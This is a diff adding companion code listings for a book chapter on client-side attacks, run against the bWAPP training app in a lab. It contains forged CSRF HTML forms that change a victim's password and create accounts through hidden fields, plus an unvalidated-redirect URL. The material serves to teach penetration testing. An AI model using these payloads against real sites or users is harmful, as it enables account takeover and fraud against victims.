@@ -1,0 +1,72 @@
+Chapter 10: Launching Client-Side Attacks
+
+Picking on the Little Guys
+
+“Sea-Surf” On Someone Else’s Board
+
+Simple Account Takeovers
+
+Modified HTML Form:
+
+<form action="http://172.16.30.129/bWAPP/csrf_1.php" method="GET">
+    <p><label for="password_new">New password:</label><br />
+    <input type="password" id="password_new" name="password_new" value=”dude”></p>
+    <p><label for="password_conf">Re-type new password:</label><br />
+    <input type="password" id="password_conf" name="password_conf" value=”dude”></p>
+    <button type="submit" name="action" value="change">Click Here</button>
+</form>
+
+
+Badges? We Don’t Need no Stinkin’ Badges!
+
+Original HTML for CSRF Attack:
+
+<form action="/bWAPP/user_extra.php" method="POST">
+    <table>
+    <tr><td>
+        <p><label for="login">Login:</label><br />
+        <input type="text" id="login" name="login"></p>
+    </td>    
+    <td width="5"></td>
+    <td>
+        <p><label for="email">E-mail:</label><br />
+        <input type="text" id="email" name="email" size="30"></p>
+    </td></tr>
+    <tr><td>
+        <p><label for="password">Password:</label><br />
+        <input type="password" id="password" name="password"></p>
+    </td>
+    <td width="25"></td>
+    <td>
+        <p><label for="password_conf">Re-type password:</label><br />
+        <input type="password" id="password_conf" name="password_conf"></p>
+    </td></tr>
+    <tr><td colspan="3">
+        <p><label for="secret">Secret:</label><br />
+        <input type="text" id="secret" name="secret" size="40"></p>        
+    </td></tr>
+    <tr><td>
+        <p><label for="mail_activation">E-mail activation:</label>
+        <input type="checkbox" id="mail_activation" name="mail_activation" value="">
+    </td></tr>
+    </table>
+    <button type="submit" name="action" value="create">Create</button>
+</form>
+Modified CSRF for account creation:
+
+<form action="http://172.16.30.129/bWAPP/user_extra.php" method="GET">
+        <input type="hidden" id="login" name="login" value="test1"></p>
+        <input type="hidden" id="email" name="email" value="test1@example.com"></p>
+        <input type="hidden" id="password" name="password" value="dude"></p>
+        <input type="hidden" id="password_conf" name="password_conf" value="dude"></p>
+        <input type="hidden" id="secret" name="secret" size="40" value="Hello Hackers"></p>
+        <input type="hidden" id="mail_activation" name="mail_activation" value=““>
+        <button type="submit" name="action" value="create">Log In Here</button>
+</form>
+
+
+Trust Me, I Know The Way!
+
+Unvalidated Redirect:
+
+http://172.16.30.129/bWAPP/unvalidated_redir_fwd_2.php?ReturnUrl=https://www.hackthissite.org/
